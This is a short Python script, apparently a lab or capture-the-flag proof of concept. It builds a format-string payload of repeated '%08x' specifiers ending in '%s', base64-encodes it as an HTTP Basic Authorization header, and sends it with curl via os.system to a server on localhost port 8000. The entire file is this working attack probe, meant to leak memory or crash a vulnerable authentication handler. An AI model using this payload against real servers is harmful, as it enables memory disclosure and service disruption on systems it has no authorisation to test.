import os

from base64 import b64encode    
x =  '%08x '    
baseInput =  "%08x "     

for i in  range(0, 5):    
    baseInput = baseInput + x    
baseInput +=  "%s:lalala"    
encoded = b64encode(baseInput.encode('ascii'))
print(baseInput)    
curl =  "curl -I 'http://127.0.0.1:8000/' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:77.0) Gecko/20100101 Firefox/77.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'Authorization: Basic "  + encoded.decode('ascii') +"'"    
print(curl)    
os.system(curl)    
print('\n\n')